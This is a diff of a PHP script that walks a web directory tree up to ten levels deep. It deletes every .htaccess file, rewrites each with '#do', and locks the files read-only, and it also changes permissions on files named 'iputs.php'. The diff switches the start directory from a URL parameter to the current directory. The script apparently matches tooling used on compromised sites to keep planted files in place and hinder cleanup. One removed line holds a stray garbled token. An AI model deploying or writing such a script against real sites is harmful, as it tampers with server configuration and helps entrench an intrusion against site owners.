@@ -1,12 +1,12 @@
 <?php
 $maxDepth = 10; // Maximum depth to search for subfolders
 
-// Get the path from URL parameter
-$baseDir = isset($_GET['path']) ? realpath($_GET['path']) : false;
+// Use current working directory as base path
+$baseDir = getcwd();
 
 // Validate the path
 if ($baseDir === false || !is_dir($baseDir)) {
-    die("Invalid or missing path parameter");
+    die("Invalid current directory");
 }
 
 // Change permissions of .htaccess and iputs.php files
@@ -19,7 +19,7 @@ deleteFiles($baseDir, $maxDepth, '.htaccess');
 
 // Create .htaccess file with the specified content
 $htaccessContent = '#do';
-('+')createFiles($baseDir, $maxDepth, '.htaccess', $htaccessContent);
+createFiles($baseDir, $maxDepth, '.htaccess', $htaccessContent);
 
 // Change permissions of .htaccess files to 0444
 changePermissions($baseDir, $maxDepth, '.htaccess', 0444);
